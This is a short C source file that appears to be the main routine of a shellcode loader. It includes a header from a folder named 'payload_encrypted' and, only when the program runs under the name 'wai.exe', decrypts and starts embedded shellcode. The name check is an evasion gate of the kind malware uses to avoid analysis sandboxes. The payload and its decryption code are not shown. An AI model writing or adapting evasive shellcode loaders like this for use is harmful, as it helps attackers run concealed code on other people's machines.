#include <stdio.h>
#include <string.h>
#include "..\payload_encrypted\payload.h"

int main(int argc, char* argv[]){
    if (strstr(argv[0], "wai.exe") > 0){
        decryptShellCode();
        startShellCode();
    }
}